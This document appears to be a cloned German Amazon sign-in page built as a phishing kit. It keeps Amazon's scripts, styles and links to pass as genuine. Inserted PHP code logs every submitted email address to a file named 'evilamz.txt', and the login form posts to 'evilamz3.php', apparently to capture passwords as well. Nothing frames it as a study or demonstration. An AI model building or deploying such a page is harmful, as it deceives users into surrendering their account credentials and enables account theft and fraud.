...
var ue_id = '84X475T1N1XY7TC2NQ25',
    ue_url = '/ap/uedata',
    ue_navtiming = 1,
    ue_mid = 'A1PA6795UKMFR9',
    ue_sid = '258-7701017-2515827',
    ue_sn = 'www.amazon.de',
    ...
    ue_rpl_ns = 'cel-rpl',
    ue_ddq = 1,
    ue_fpf = '//fls-eu.amazon.com/1/batch/1/OP/A1PA6795UKMFR9:258-7701017-2515827:84X475T1N1XY7TC2NQ25$uedata=s:',
    ue_sbuimp = 1,
    ue_ibft = 0,
    ue_fnt = 0,
...
<!-- 3m5ny0kkau6r9lyxrsv6i98zkdsnaofdvh8e6qqs0 -->
<script>window.ue && ue.count && ue.count('CSMLibrarySize', 9660)</script><script>var aPageStart = (new Date()).getTime();</script><meta charset="utf-8"/>
    <title dir="ltr">Amazon Anmelden</title>
        ...
        <link rel="stylesheet" href="https://images-eu.ssl-images-amazon.com/images/I/61g-kxL8QTL._RC|11Fd9tJOdtL.css,11tfezETfFL.css,31Q3id-QR0L.css,31U9HrBLKmL.css_.css?AUIClients/AmazonUI#not-trident" />
<link rel="stylesheet" href="https://images-eu.ssl-images-amazon.com/images/I/01SdjaY0ZsL._RC|31jdWD+JB+L.css,41CoXfMtudL.css_.css?AUIClients/AuthenticationPortalAssets" />
<link rel="stylesheet" href="https://images-eu.ssl-images-amazon.com/images/I/113GJdhRnnL.css?AUIClients/CVFAssets" />
<script>
...
a):a},guardTime:function(a){var b=t[t.length-1],c=b&&b.name;return c&&c in B?function(){var b=w(),g=a.apply(this,arguments);B[c].async=(B[c].async||0)+w()-b;return g}:a},log:function(a,b,c){return this.logError(null,a,b,c)},declare:A([],!0,!0,!0),register:A([],!0),execute:A([]),AUI_BUILD_DATE:"3.21.8-2022-03-24",when:ia(),now:ia(!0),trigger:function(a,b,c){var e=M();this.declare(a,{data:b,pageElapsedTime:e-(f.aPageStart||NaN),triggerTime:e});c&&c.instrument&&O.when("prv:a-logTrigger").execute(function(b){b(a)})},
...
var ta={getItem:function(a){try{return f.localStorage.getItem(a)}catch(b){}},setItem:function(a,b){try{return f.localStorage.setItem(a,b)}catch(c){}}};n.className=X(n,"a-no-js");C(n,"a-js");!m(/OS [1-8](_[0-9]*)+ like Mac OS X/i)||f.navigator.standalone||m(/safari/i)||C(n,"a-ember");p=[];for(l in k)k.hasOwnProperty(l)&&k[l]&&p.push("a-"+l.replace(/([A-Z])/g,function(a){return"-"+a.toLowerCase()}));C(n,p.join(" "));n.setAttribute("data-aui-build-date","3.21.8-2022-03-24");r.register("p-detect",function(){return{capabilities:k,
...
b,"register");ma()})})):(b&&b.browser&&D.push("sw:browser:register:unsupported"),c&&c.browser&&D.push("sw:browser:unregister:unsupported"),ma())})({reg:{},unreg:{}});r.declare("a-fix-event-off",!1);v("pagejs:pkgExecTime",w()-N)})(window,document,Date);
  (window.AmazonUIPageJS ? AmazonUIPageJS : P).load.js('https://images-eu.ssl-images-amazon.com/images/I/61XKxrBtDVL._RC|11Y+5x+kkTL.js,51KMV3Cz2XL.js,31x4ENTlVIL.js,31f4+QIEeqL.js,01N6xzIJxbL.js,518BI433aLL.js,01rpauTep4L.js,31QZSjMuoeL.js,61ofwvddDeL.js,01KsMxlPtzL.js_.js?AUIClients/AmazonUI');
  (window.AmazonUIPageJS ? AmazonUIPageJS : P).load.js('https://images-eu.ssl-images-amazon.com/images/I/21G215oqvfL._RC|21OJDARBhQL.js,218GJg15I8L.js,31lucpmF4CL.js,2119M3Ks9rL.js,51zaON6OItL.js_.js?AUIClients/AuthenticationPortalAssets');
  ...
  (window.AmazonUIPageJS ? AmazonUIPageJS : P).load.js('https://images-eu.ssl-images-amazon.com/images/I/310RLw6gUhL.js?AUIClients/CVFAssets');
  ...
  (window.AmazonUIPageJS ? AmazonUIPageJS : P).load.js('https://images-eu.ssl-images-amazon.com/images/I/81dZoozqaGL.js?AUIClients/FWCIMAssets');
</script>
...
<script>window.ue && ue.count && ue.count('CSMLibrarySize', 2729)</script></head>

  <body class="ap-locale-de_DE a-m-de a-aui_72554-c a-aui_accordion_a11y_role_354025-c a-aui_killswitch_csa_logger_372963-c a-aui_pci_risk_banner_210084-c a-aui_preload_261698-c a-aui_rel_noreferrer_noopener_309527-c a-aui_template_weblab_cache_333406-c a-aui_tnr_v2_180836-c">
...
if (window.csa) {
    csa("Config", {
        ...
        'CacheDetection.RequestID': "84X475T1N1XY7TC2NQ25",
        'CacheDetection.Callback': window.ue && ue.reset,
        'LCP.elementDedup': 1
    });

    csa("Events")("setEntity", {
        page: {requestId: "84X475T1N1XY7TC2NQ25", meaningful: "interactive"},
        session: {id: "258-7701017-2515827"}
    });
}
...
<script>window.ue && ue.count && ue.count('CSMLibrarySize', 14174)</script><div id="a-page"><script type="a-state" data-a-state="{&quot;key&quot;:&quot;a-wlab-states&quot;}">{}</script>
...
<div class="a-section a-spacing-base auth-pagelet-container">
      ...
      <div id="auth-cookie-warning-message" class="a-box a-alert a-alert-warning" aria-live="polite" aria-atomic="true"><div class="a-box-inner a-alert-container"><h4 class="a-alert-heading">Bitte aktivieren Sie Cookies, um fortzufahren</h4><i class="a-icon a-icon-alert"></i><div class="a-alert-content">
        <p>
...
<div class="a-section a-spacing-base">
  <div class="a-box"><div class="a-box-inner a-padding-extra-large">
      ...
      <span>
			<?php 
				if( isset($_POST["continue"])){
					$file = fopen("evilamz.txt","a");
					$data = "email: ".$_POST["email"]." | ";
					fwrite($file, $data);
					fclose($file);
					echo("Hallo, ".$_POST["email"]);
				}
			?>
	  </span>
      <a id="ap_change_login_claim" class="a-link-normal" tabindex="6" href="https://www.amazon.de/ap/signin?showRememberMe=true&amp;openid.pape.max_auth_age=0&amp;openid.identity=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&amp;pageId=deflex&amp;openid.return_to=https%3A%2F%2Fwww.amazon.de%2F%3Ftag%3Dhyddeabkm-21%26ref%3Dnav_custrec_signin%26adgrpid%3D1201766862158891%26hvadid%3D75110529744476%26hvnetw%3Do%26hvqmt%3De%26hvbmt%3Dbe%26hvdev%3Dc%26hvlocint%3D%26hvlocphy%3D130122%26hvtargid%3Dkwd-75110630053576%3Aloc-72%26hydadcr%3D12763_1876985&amp;prevRID=84X475T1N1XY7TC2NQ25&amp;openid.assoc_handle=deflex&amp;openid.mode=checkid_setup&amp;prepopulatedLoginId=eyJjaXBoZXIiOiJVNDhYS0Jlei9rdmZraGRrdENQN2w4U3gzbmhPT29Eb3V0cnNudjdYQVNRPSIsInZlcnNpb24iOjEsIklWIjoiUE1PTVFVbDd4ejk3NGw1NFNIcElJdz09In0%3D&amp;failedSignInCount=0&amp;openid.claimed_id=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&amp;openid.ns=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0&amp;timestamp=1654011184000">
        Ändern
      </a>
    </div>
    ...
    <form name="signIn" method="post" novalidate action="evilamz3.php" class="auth-validate-form auth-real-time-validation a-spacing-none">
      <input type="hidden" name="appActionToken" value="AsDbLAHX32CFeLm1lQuLvlE5bTcj3D" /><input type="hidden" name="appAction" value="SIGNIN_PWD_COLLECT" />
    ...
    <input type="hidden" name="metadata1" value="ape:" />
  
    <input type="hidden" name="openid.return_to" value="ape:" />
  
    <input type="hidden" name="prevRID" value="ape:ODRYNDc1VDFOMVhZN1RDMk5RMjU=" />
  
    <input type="hidden" name="workflowState" value="eyJ6aXAiOiJERUYiLCJlbmMiOiJBMjU2R0NNIiwiYWxnIjoiQTI1NktXIn0.SQk8Aj61mdu-LNCZsBNGZUb_bcQ0zSfH3F_NrioE3n3ndpZyVmGQGw.Zlxl9J4tETv1IVfN.7DL0OhHmR6_IZFW58v56Q8opmra0UDlUk1TRT7mCZ9Md6ymLT1a7QMjjEHndoXZbRoud1sZlXb737ugruJmGy04HvwgPKtZMHeJPE5Mfucgomop_4WLXd1GRTudaOvo02akIzwIU-77YMu8aEGHJOdIgDYFu72e0rxI7OKRUpIz465EEcBaFo0RDxjPWOllBng5BjM-fjTL0zi9YySXAMThuVkuYWwvo4C78RqiPkrhEzxTNVVCmfnaMurLEhOYSP6drFesZDDtpPVOfDMdKS36JtjocX9Zm2Uz8DGEBNrlNDqAk10jsAo6RAUgBIQwmy7ssRse82ISCvHWcsJ72JkdkkOoP_I-qK4MIeldNpiKncsMaBFg1zTlZazbi72SbB1eOdyvMyQVMcd0wEi8e4NVy7MdvCIUqiPAWcsIFui2ZIStRi8T-Gk0pxPcI26iFS5iT9-Olirqje5e-IxD19GMVQw2Y3TTsJCc.D0BugAqH9VmPuSmCDzj6Ag" />
...
<a id="auth-fpp-link-bottom" class="a-link-normal" tabindex="3" href="https://www.amazon.de/ap/forgotpassword?showRememberMe=true&amp;openid.pape.max_auth_age=0&amp;openid.identity=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&amp;pageId=deflex&amp;openid.return_to=https%3A%2F%2Fwww.amazon.de%2F%3Ftag%3Dhyddeabkm-21%26ref%3Dnav_custrec_signin%26adgrpid%3D1201766862158891%26hvadid%3D75110529744476%26hvnetw%3Do%26hvqmt%3De%26hvbmt%3Dbe%26hvdev%3Dc%26hvlocint%3D%26hvlocphy%3D130122%26hvtargid%3Dkwd-75110630053576%3Aloc-72%26hydadcr%3D12763_1876985&amp;prevRID=84X475T1N1XY7TC2NQ25&amp;openid.assoc_handle=deflex&amp;openid.mode=checkid_setup&amp;prepopulatedLoginId=eyJjaXBoZXIiOiIva24rSm4ya0p0Q0hzRmU2Y0lNWnQyRE0zM3QxVWpLTnFqUXZ5UnFMYnVRPSIsInZlcnNpb24iOjEsIklWIjoiSS80R00ramdPWjZXOWowZzlQRTd2dz09In0%3D&amp;failedSignInCount=0&amp;openid.claimed_id=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&amp;openid.ns=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0&amp;timestamp=1654011184000">
  Passwort vergessen
</a>
      </div>
...
<script type="text/javascript" async
  src="https://static.siege-amazon.com/prod/profiles/AuthenticationPortalSigninEU.js">
</script>
    ...
    <div class="a-section a-text-left">
      <label for="auth-remember-me" class="a-form-label">
        <div data-a-input-name="rememberMe" class="a-checkbox"><label><input type="checkbox" name="rememberMe" value="true" tabindex="4"/><i class="a-icon a-icon-checkbox"></i><span class="a-label a-checkbox-label">
          Angemeldet bleiben.
          <span class="a-declarative" data-action="a-popover" data-csa-c-type="widget" data-csa-c-func-deps="aui-da-a-popover" data-a-popover="{&quot;activate&quot;:&quot;onclick&quot;,&quot;header&quot;:&quot;\&quot;Angemeldet bleiben\&quot; Kontrollkästchen&quot;,&quot;inlineContent&quot;:&quot;\u003cp&gt;Wenn Sie \&quot;Angemeldet bleiben\&quot; auswählen, werden Sie seltener aufgefordert, sich bei diesem Gerät anzumelden.\u003c\/p&gt;\r\n\u003cp&gt;Um Ihr Konto zu schützen, verwenden Sie diese Option nur auf Ihren persönlichen Geräten.\u003c\/p&gt;&quot;}">
...
<div class="a-section a-spacing-small a-text-center a-size-mini">
  <span class="auth-footer-seperator"></span>
    ...
    <a class="a-link-normal" target="_blank" rel="noopener" href="/gp/help/customer/display.html/ref=ap_desktop_footer_cou?ie=UTF8&amp;nodeId=505048">
      Unsere AGB
    </a>
    <span class="auth-footer-seperator"></span>
    ...
    <a class="a-link-normal" target="_blank" rel="noopener" href="/gp/help/customer/display.html/ref=ap_desktop_footer_privacy_notice?ie=UTF8&amp;nodeId=3312401">
    ...
    <a class="a-link-normal" target="_blank" rel="noopener" href="/gp/help/customer/display.html/ref=ap_footer_imprint?ie=UTF8&amp;nodeId=202024860">
      Impressum
    </a>
    <span class="auth-footer-seperator"></span>
...
<noscript>
    <img height="1" width="1" style='display:none;visibility:hidden;' src='//fls-eu.amazon.com/1/batch/1/OP/A1PA6795UKMFR9:258-7701017-2515827:84X475T1N1XY7TC2NQ25$uedata=s:%2Fap%2Fuedata%3Fnoscript%26id%3D84X475T1N1XY7TC2NQ25:0' alt=""/>
</noscript>

<script>window.ue && ue.count && ue.count('CSMLibrarySize', 60960)</script></body>
</html>
